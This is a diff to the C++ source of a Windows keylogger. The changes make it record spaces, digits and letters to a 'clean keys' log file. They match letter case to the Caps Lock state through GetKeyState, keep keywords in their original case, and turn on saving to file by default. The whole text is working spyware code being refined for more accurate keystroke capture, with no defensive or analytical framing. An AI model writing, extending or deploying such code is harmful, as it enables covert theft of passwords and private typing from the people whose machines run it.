@@ -114,6 +114,12 @@ void Keylogger::get_key(std::ofstream &file_logs)
 				key = "[CAPS LOCK]";
 			else if (c == 27)
 				key = "[ESC]";
+			else if (c == ' ') // Space
+			{
+				key = c;
+				all_keys.append(key);
+				save_to_file(file_logs_clean_keys, key);
+			}
 			else if (c == 33)
 				key = "[PAGE UP]";
 			else if (c == 34)
@@ -134,11 +140,22 @@ void Keylogger::get_key(std::ofstream &file_logs)
 				key = "[INS]";
 			else if (c == 46)
 				key = "[DEL]";
-			else if ((c >= 65 && c <= 90)
-				|| (c >= 48 && c <= 57)
-				|| c == 32) // letters and numbers
+			else if (c >= '0' && c <= '9') // Numbers
 			{
 				key = c;
+				all_keys.append(key);
+				save_to_file(file_logs_clean_keys, key);
+			}
+			else if (c >= 'A' && c <= 'Z') // Letters
+			{
+				key = c;
+
+				if ((GetKeyState(VK_CAPITAL) & 0x001) == 0)
+				{
+					//Caps Lock is OFF
+					std::transform(key.begin(), key.end(), key.begin(), ::tolower);
+				}
+				
 				all_keys.append(key);
 				save_to_file(file_logs_clean_keys, key);
 			}
@@ -275,7 +292,6 @@ std::vector<std::string> get_keywords()
 	while (strings_split >> keyword)
 	{
 		std::cout << "Keyword: " << keyword << "\n";
-		std::transform(keyword.begin(), keyword.end(), keyword.begin(), ::toupper);
 		keywords.push_back(keyword);
 	}
 
@@ -284,7 +300,7 @@ std::vector<std::string> get_keywords()
 
 int main(int argc, char *argv[])
 {
-	bool saving_enabled = false;
+	bool saving_enabled = true;
 
 	std::vector<std::string> keywords = get_keywords();
 
